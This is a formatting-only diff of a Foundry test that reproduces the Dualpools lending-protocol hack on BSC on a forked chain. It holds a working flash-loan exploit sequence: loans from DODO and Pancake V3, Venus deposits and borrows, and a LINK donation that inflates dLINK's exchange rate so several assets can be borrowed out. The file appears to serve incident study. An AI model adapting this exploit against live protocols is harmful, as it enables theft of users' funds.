@@ -5,12 +5,12 @@ import "./../interface.sol";
 // @KeyInfo - Total Lost : ~$42000 USD
 // Attacker : https://bscscan.com/address/0x4645863205b47a0a3344684489e8c446a437d66c
 // Attack Contract : https://bscscan.com/address/0x38721b0d67dfdba1411bb277d95af3d53fa7200e
-// Vulnerable Contract : https://bscscan.com/address/0x5e5e28029ef37fc97ffb763c4ac1f532bbd4c7a2                
+// Vulnerable Contract : https://bscscan.com/address/0x5e5e28029ef37fc97ffb763c4ac1f532bbd4c7a2
 // Attack Tx : https://bscscan.com/tx/0x90f374ca33fbd5aaa0d01f5fcf5dee4c7af49a98dc56b47459d8b7ad52ef1e93
 
 // @Info
 // Vulnerable Contract Code : https://bscscan.com/address/0x5e5e28029ef37fc97ffb763c4ac1f532bbd4c7a2#code
-                          
+
 // @Analysis
 // https://lunaray.medium.com/dualpools-hack-analysis-5209233801fa
 
@@ -30,9 +30,13 @@ interface IMarketFacet {
 
     // function checkMembership(address account, VToken vToken) external view returns (bool);
 
-    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
+    function enterMarkets(
+        address[] calldata vTokens
+    ) external returns (uint256[] memory);
 
-    function exitMarket(address vToken) external returns (uint256);
+    function exitMarket(
+        address vToken
+    ) external returns (uint256);
 
     // function _supportMarket(VToken vToken) external returns (uint256);
 
@@ -44,30 +48,42 @@ interface IMarketFacet {
 }
 
 interface VBep20Interface {
+    function transfer(address dst, uint256 amount) external returns (bool);
 
-    function transfer(address dst, uint amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
 
-    function approve(address spender, uint amount) external returns (bool);
+    function balanceOf(
+        address owner
+    ) external view returns (uint256);
 
-    function balanceOf(address owner) external view returns (uint);
-
-    /*** User Interface ***/
-
-    function mint(uint mintAmount) external returns (uint);
+    /**
+     * User Interface **
+     */
+    function mint(
+        uint256 mintAmount
+    ) external returns (uint256);
 
     function mint() external payable;
 
-    function mintBehalf(address receiver, uint mintAmount) external returns (uint);
+    function mintBehalf(address receiver, uint256 mintAmount) external returns (uint256);
 
-    function redeem(uint redeemTokens) external returns (uint);
+    function redeem(
+        uint256 redeemTokens
+    ) external returns (uint256);
 
-    function redeemUnderlying(uint redeemAmount) external returns (uint);
+    function redeemUnderlying(
+        uint256 redeemAmount
+    ) external returns (uint256);
 
-    function borrow(uint borrowAmount) external returns (uint);
+    function borrow(
+        uint256 borrowAmount
+    ) external returns (uint256);
 
-    function repayBorrow(uint repayAmount) external returns (uint);
+    function repayBorrow(
+        uint256 repayAmount
+    ) external returns (uint256);
 
-    function repayBorrowBehalf(address borrower, uint repayAmount) external returns (uint);
+    function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);
 
     // function liquidateBorrow(
     //     address borrower,
@@ -75,9 +91,12 @@ interface VBep20Interface {
     //     VTokenInterface vTokenCollateral
     // ) external returns (uint);
 
-    /*** Admin Functions ***/
-
-    function _addReserves(uint addAmount) external returns (uint);
+    /**
+     * Admin Functions **
+     */
+    function _addReserves(
+        uint256 addAmount
+    ) external returns (uint256);
 }
 
 contract ContractTest is Test {
@@ -108,9 +127,8 @@ contract ContractTest is Test {
     IPancakePair pancakeSwap = IPancakePair(0x824eb9faDFb377394430d2744fa7C42916DE3eCe); // LINK-WBNB
     Uni_Pair_V3 pool = Uni_Pair_V3(0x172fcD41E0913e95784454622d1c3724f546f849);
 
-
     function setUp() public {
-        vm.createSelectFork("bsc", 36145772-1);
+        vm.createSelectFork("bsc", 36_145_772 - 1);
         vm.label(address(this), "AttackContract");
         vm.label(address(WBNB), "WBNB");
         vm.label(address(LINK), "LINK");
@@ -141,62 +159,59 @@ contract ContractTest is Test {
 
     function testAttack() public {
         approveAll();
-        DPPOracle_0x1b52.flashLoan(7001000000000000000, 0, address(this), new bytes(1)); // borrow BUSD
-
+        DPPOracle_0x1b52.flashLoan(7_001_000_000_000_000_000, 0, address(this), new bytes(1)); // borrow BUSD
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         console.log(msg.sender);
-        if(msg.sender == address(DPPOracle_0x1b52)){
+        if (msg.sender == address(DPPOracle_0x1b52)) {
             pancakeSwap.swap(0, 1000, address(this), data); // pancakeCall , swap BUSD to LINK
-            BUSD.transfer(address(DPPOracle_0x1b52), 7001000000000000000);
-        }else if(msg.sender == address(DPPOracle_0x8191)) {
-            pool.flash(address(this), 70000000000000000000000, 0, new bytes(1)); // v3call , borrow BUSD
+            BUSD.transfer(address(DPPOracle_0x1b52), 7_001_000_000_000_000_000);
+        } else if (msg.sender == address(DPPOracle_0x8191)) {
+            pool.flash(address(this), 70_000_000_000_000_000_000_000, 0, new bytes(1)); // v3call , borrow BUSD
             WBNB.transfer(address(pancakeSwap), 59);
         }
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
-        DPPOracle_0x8191.flashLoan(312497349377117598837, 154451704908346387787280, address(this), data); // borrow WBNB and BUSD
+        DPPOracle_0x8191.flashLoan(312_497_349_377_117_598_837, 154_451_704_908_346_387_787_280, address(this), data); // borrow WBNB and BUSD
     }
 
     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
-        
         address[] memory tokenList = new address[](2);
         tokenList[0] = address(vBUSD);
         tokenList[1] = address(vWBNB);
         VenusProtocol.enterMarkets(tokenList);
-        vBUSD.mint(224451704908346387787280); // 969266514517797 vBUSD
-        WBNB.withdraw(312497349377117598837);
-        vWBNB.mint{value: 312497349377117598837 wei}(); // 1320879335222 vBNB
-        vLINK.borrow(11500000000000000000000);
+        vBUSD.mint(224_451_704_908_346_387_787_280); // 969266514517797 vBUSD
+        WBNB.withdraw(312_497_349_377_117_598_837);
+        vWBNB.mint{value: 312_497_349_377_117_598_837 wei}(); // 1320879335222 vBNB
+        vLINK.borrow(11_500_000_000_000_000_000_000);
 
         dLINK.mint(2);
-        LINK.transfer(address(dLINK), 11499999999999999999998);
+        LINK.transfer(address(dLINK), 11_499_999_999_999_999_999_998);
         address[] memory tokenList1 = new address[](1);
         tokenList1[0] = address(dLINK);
         Dualpools.enterMarkets(tokenList1);
-        dWBNB.borrow(50074555376020317788);
-        dBTCB.borrow(171600491170058684);
-        dETH.borrow(3992080357935675366);
-        dADA.borrow(6378808489713884698357);
-        dBUSD.borrow(911577468904829524350);
-        dLINK.redeemUnderlying(11499999999999999999898);
+        dWBNB.borrow(50_074_555_376_020_317_788);
+        dBTCB.borrow(171_600_491_170_058_684);
+        dETH.borrow(3_992_080_357_935_675_366);
+        dADA.borrow(6_378_808_489_713_884_698_357);
+        dBUSD.borrow(911_577_468_904_829_524_350);
+        dLINK.redeemUnderlying(11_499_999_999_999_999_999_898);
 
         // LINK.transfer(address(this), 1000); // not necessary
 
-        vLINK.repayBorrow(11500000000000000000000);
-        vBUSD.redeem(969266514517797);
-        vWBNB.redeem(1320879335222);
+        vLINK.repayBorrow(11_500_000_000_000_000_000_000);
+        vBUSD.redeem(969_266_514_517_797);
+        vWBNB.redeem(1_320_879_335_222);
 
         // BUSD.transfer(address(this), 7001000000000000000); // not necessary
-        BUSD.transfer(address(DPPOracle_0x8191), 154451704908346387787280);
-        BUSD.transfer(address(pool), 70007000000000000000000);
+        BUSD.transfer(address(DPPOracle_0x8191), 154_451_704_908_346_387_787_280);
+        BUSD.transfer(address(pool), 70_007_000_000_000_000_000_000);
 
-        WBNB.deposit{value: 362571904345528150166}();
-        WBNB.transfer(address(DPPOracle_0x8191), 312497349377117598837);
+        WBNB.deposit{value: 362_571_904_345_528_150_166}();
+        WBNB.transfer(address(DPPOracle_0x8191), 312_497_349_377_117_598_837);
     }
-
 
     receive() external payable {}
     fallback() external payable {}
